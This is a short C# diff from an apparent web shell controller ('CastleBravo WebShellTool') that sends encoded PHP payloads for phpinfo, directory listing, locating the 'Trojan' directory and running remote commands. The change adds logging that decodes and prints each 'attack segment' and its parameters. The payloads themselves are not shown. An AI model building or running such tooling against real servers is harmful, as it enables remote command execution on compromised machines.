@@ -100,7 +100,10 @@ namespace C2.Business.CastleBravo.WebShellTool
             string payload = String.Format("{0}={1}", prefix, clientSetting.PHP_INFO);
 
             sb.AppendLine("phpinfo:")
-              .AppendLine(payload);
+              .AppendLine(payload)
+              .AppendLine(string.Format("引导段:{0}", prefix))
+              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_INFO)))
+              .AppendLine();
 
             return Post(payload);
         }
@@ -109,8 +112,11 @@ namespace C2.Business.CastleBravo.WebShellTool
         {
             string payload = String.Format("{0}={1}", prefix, clientSetting.PHP_INDEX);
 
-            sb.AppendLine("浏览目录:")
-              .AppendLine(payload);
+            sb.AppendLine("定位Trojan所在目录:")
+              .AppendLine(payload)
+              .AppendLine(string.Format("引导段:{0}", prefix))
+              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_INDEX)))
+              .AppendLine();
 
             string[] result = Post(payload).Split('\t');
             return result.Skip(0).Take(result.Length - 1).ToList();
@@ -123,6 +129,13 @@ namespace C2.Business.CastleBravo.WebShellTool
                 clientSetting.PHP_READDICT, 
                 clientSetting.PARAM1, 
                 Encode(path));
+            
+            sb.AppendLine("遍历目录:")
+              .AppendLine(payload)
+              .AppendLine(string.Format("引导段:{0}", prefix))
+              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_READDICT)))
+              .AppendLine(string.Format("参数一:{0}", ST.SuperDecodeBase64(path)))
+              .AppendLine();
 
             return Post(payload);
         }
@@ -138,7 +151,12 @@ namespace C2.Business.CastleBravo.WebShellTool
                 Encode(command));
 
             sb.AppendLine("Remote Command:" + command)
-              .AppendLine(payload);
+              .AppendLine(payload)
+              .AppendLine(string.Format("引导段:{0}", prefix))
+              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_SHELL)))
+              .AppendLine(string.Format("参数一:{0}", ST.SuperDecodeBase64(shellEnv)))
+              .AppendLine(string.Format("参数二:{0}", ST.SuperDecodeBase64(command)))
+              .AppendLine();
 
             return Post(payload);
         }
